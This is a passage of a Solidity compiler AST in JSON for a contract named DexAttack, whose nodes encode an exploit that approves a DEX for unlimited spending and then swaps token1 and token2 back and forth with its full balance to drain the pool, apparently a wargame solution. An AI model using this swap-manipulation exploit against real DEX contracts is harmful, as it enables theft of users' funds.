																	"id": 782,
																	"name": "token2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 729,
																	"src": "702:6:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 781,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 664,
																"src": "695:6:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 783,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "695:14:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$664",
																"typeString": "contract IERC20"
															}
														},
														"id": 784,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "710:12:4",
														"memberName": "transferFrom",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 663,
														"src": "695:27:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,address,uint256) external returns (bool)"
														}
													},
													"id": 792,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "695:58:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 793,
												"nodeType": "ExpressionStatement",
												"src": "695:58:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 798,
															"name": "dex",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 733,
															"src": "787:3:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"expression": {
																"arguments": [
																	{
																		"id": 801,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "797:4:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": {
																			"id": 800,
																			"name": "uint",
																			"nodeType": "ElementaryTypeName",
																			"src": "797:4:4",
																			"typeDescriptions": {}
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		}
																	],
																	"id": 799,
																	"name": "type",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967269,
																	"src": "792:4:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_metatype_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 802,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "792:10:4",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_meta_type_t_uint256",
																	"typeString": "type(uint256)"
																}
															},
															"id": 803,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"memberLocation": "803:3:4",
															"memberName": "max",
															"nodeType": "MemberAccess",
															"src": "792:14:4",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 795,
																	"name": "token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 727,
																	"src": "771:6:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 794,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 664,
																"src": "764:6:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 796,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "764:14:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$664",
																"typeString": "contract IERC20"
															}
														},
														"id": 797,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "779:7:4",
														"memberName": "approve",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 651,
														"src": "764:22:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,uint256) external returns (bool)"
														}
													},
													"id": 804,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "764:43:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 805,
												"nodeType": "ExpressionStatement",
												"src": "764:43:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 810,
															"name": "dex",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 733,
															"src": "840:3:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"expression": {
																"arguments": [
																	{
																		"id": 813,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "850:4:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": {
																			"id": 812,
																			"name": "uint",
																			"nodeType": "ElementaryTypeName",
																			"src": "850:4:4",
																			"typeDescriptions": {}
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		}
																	],
																	"id": 811,
																	"name": "type",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967269,
																	"src": "845:4:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_metatype_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 814,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "845:10:4",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_meta_type_t_uint256",
																	"typeString": "type(uint256)"
																}
															},
															"id": 815,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"memberLocation": "856:3:4",
															"memberName": "max",
															"nodeType": "MemberAccess",
															"src": "845:14:4",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 807,
																	"name": "token2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 729,
																	"src": "824:6:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 806,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 664,
																"src": "817:6:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 808,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "817:14:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$664",
																"typeString": "contract IERC20"
															}
														},
														"id": 809,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "832:7:4",
														"memberName": "approve",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 651,
														"src": "817:22:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,uint256) external returns (bool)"
														}
													},
													"id": 816,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "817:43:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 817,
												"nodeType": "ExpressionStatement",
												"src": "817:43:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 822,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 727,
															"src": "886:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 823,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "894:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"id": 830,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967268,
																			"src": "935:4:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		],
																		"id": 829,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "927:7:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 828,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "927:7:4",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 831,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "927:13:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"arguments": [
																		{
																			"id": 825,
																			"name": "token1",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 727,
																			"src": "909:6:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 824,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 664,
																		"src": "902:6:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 826,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "902:14:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$664",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 827,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "917:9:4",
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 621,
																"src": "902:24:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 832,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "902:39:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 819,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "876:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 818,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "871:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 820,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "871:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 821,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "881:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "871:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 833,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "871:71:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 834,
												"nodeType": "ExpressionStatement",
												"src": "871:71:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 839,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "969:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 840,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 727,
															"src": "977:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"id": 847,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967268,
																			"src": "1018:4:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		],
																		"id": 846,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1010:7:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 845,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "1010:7:4",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 848,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1010:13:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"arguments": [
																		{
																			"id": 842,
																			"name": "token2",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 729,
																			"src": "992:6:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 841,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 664,
																		"src": "985:6:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 843,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "985:14:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$664",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 844,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "1000:9:4",
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 621,
																"src": "985:24:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 849,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "985:39:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 836,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "959:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 835,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "954:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 837,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "954:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 838,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "964:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "954:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 850,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "954:71:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 851,
												"nodeType": "ExpressionStatement",
												"src": "954:71:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 856,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 727,
															"src": "1050:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 857,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "1058:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"id": 864,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967268,
																			"src": "1099:4:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		],
																		"id": 863,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1091:7:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 862,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "1091:7:4",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 865,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1091:13:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"arguments": [
																		{
																			"id": 859,
																			"name": "token1",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 727,
																			"src": "1073:6:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 858,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 664,
																		"src": "1066:6:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 860,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1066:14:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$664",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 861,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "1081:9:4",
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 621,
																"src": "1066:24:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 866,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1066:39:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 853,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "1040:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 852,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "1035:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 854,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1035:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 855,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "1045:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "1035:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 867,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1035:71:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 868,
												"nodeType": "ExpressionStatement",
												"src": "1035:71:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 873,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "1131:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 874,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 727,
															"src": "1139:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"id": 881,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967268,
																			"src": "1180:4:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		],
																		"id": 880,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1172:7:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 879,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "1172:7:4",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 882,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1172:13:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"arguments": [
																		{
																			"id": 876,
																			"name": "token2",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 729,
																			"src": "1154:6:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
